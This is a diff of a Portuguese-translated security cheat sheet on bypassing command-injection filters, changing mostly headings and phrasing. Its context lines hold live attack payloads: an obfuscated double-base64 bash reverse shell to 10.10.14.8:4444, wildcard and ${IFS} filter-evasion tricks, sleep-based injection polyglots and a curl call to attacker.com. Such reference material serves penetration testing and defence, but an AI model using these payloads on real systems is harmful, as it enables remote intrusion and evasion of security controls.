@@ -4,7 +4,7 @@
 
 ## Bypasses de Limitações Comuns
 
-### Shell Reversa
+### Reverse Shell
 ```bash
 # Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
@@ -18,7 +18,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### Bypass Paths and forbidden words
+### Bypass Paths e palavras proibidas
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -144,7 +144,7 @@ Você pode usar **burpcollab** ou [**pingb**](http://pingb.in) como exemplo.
 
 ### Builtins
 
-Caso você não consiga executar funções externas e tenha acesso apenas a um **conjunto limitado de builtins para obter RCE**, existem alguns truques úteis para fazê-lo. Normalmente, você **não poderá usar todos** os **builtins**, então você deve **conhecer todas as suas opções** para tentar contornar a prisão. Ideia de [**devploit**](https://twitter.com/devploit).\
+Caso você não consiga executar funções externas e tenha acesso apenas a um **conjunto limitado de builtins para obter RCE**, existem algumas dicas úteis para fazê-lo. Normalmente, você **não poderá usar todos** os **builtins**, então você deve **conhecer todas as suas opções** para tentar contornar a prisão. Ideia de [**devploit**](https://twitter.com/devploit).\
 Primeiro, verifique todos os [**builtins do shell**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Aqui estão algumas **recomendações**:
 ```bash
 # Get list of builtins
@@ -202,7 +202,7 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### Bypass de regexes potenciais
+### Bypass potencial regexes
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
@@ -335,7 +335,7 @@ Casos de uso práticos:
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 - [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
+- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju)
 
 - [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
